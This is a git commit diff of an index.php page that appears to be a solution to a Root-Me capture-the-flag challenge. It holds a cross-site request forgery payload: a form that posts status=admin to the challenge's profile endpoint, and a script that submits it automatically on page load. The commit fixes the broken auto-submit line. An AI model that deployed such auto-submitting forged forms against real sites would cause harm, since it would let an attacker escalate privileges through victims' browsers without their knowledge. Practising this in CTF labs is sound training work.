fbbc1f4c2d535a34d55e4a654d521ac56aabcb91
EstelleDab <152979607+EstelleDab@users.noreply.github.com>
2025-02-26 10:00:52 +0100

    modif index.php

--- index.php
+++ index.php
@@ -7,24 +7,25 @@
 </head>
 <body>
    <div>
-		<fieldset><legend>Update Profile</legend>
-		<form action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="post" enctype="multipart/form-data">
-		<div class="form-group">
-		<label>Username:</label>
-		<input type="text" name="username" value="Estelle31">
-		</div>
-		<br>		
-		<div class="form-group">
-		<label>Status:</label>
-		<input type="checkbox" name="status" value="admin" checked="checked">
-		</div>
-		<br>	
-		<button type="submit">Submit</button>
-		</form></fieldset>
-		</div>
+        <fieldset><legend>Update Profile</legend>
+        <form id="updateProfileForm" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="post" enctype="multipart/form-data">
+        <div class="form-group">
+        <label>Username:</label>
+        <input type="text" name="username" value="Estelle31">
+        </div>
+        <br>        
+        <div class="form-group">
+        <label>Status:</label>
+        <input type="checkbox" name="status" value="admin" checked="checked">
+        </div>
+        <br>    
+        <button type="submit">Submit</button>
+        </form></fieldset>
+        </div>
 
     <script>
-       document.form[0].submit();
+       document.getElementById('updateProfileForm').submit();
     </script>
 </body>
 </html>
+
